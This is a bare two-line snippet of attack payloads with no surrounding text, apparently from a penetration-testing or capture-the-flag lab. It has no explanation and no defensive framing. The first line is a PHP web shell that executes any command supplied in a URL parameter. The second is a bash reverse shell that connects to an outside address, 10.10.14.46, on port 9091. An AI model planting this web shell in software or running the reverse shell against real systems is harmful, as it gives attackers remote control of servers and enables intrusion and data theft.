<?php echo system($_GET['cmd']); ?>
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.46/9091 0>&1'
